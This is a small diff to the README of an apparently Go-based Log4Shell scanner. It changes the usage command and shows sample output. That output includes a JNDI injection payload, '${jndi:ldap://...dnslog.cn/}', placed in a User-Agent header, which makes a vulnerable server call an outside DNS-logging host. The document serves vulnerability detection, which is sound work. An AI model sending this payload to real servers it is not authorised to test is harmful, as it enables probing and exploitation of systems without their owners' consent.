@@ -2,7 +2,7 @@
 
 
 ```bash
-$ log4shell_looker http://127.0.0.1:8080/
+$ go run main.go http://127.0.0.1:8080/
 [+++] Your domain generated :  rfcbd0.dnslog.cn
 [+++] Your session is :  1s16v8k8fmrmd5rljun51lmur4
 [***] Payload :  User-Agent:${jndi:ldap://rfcbd0.dnslog.cn/}
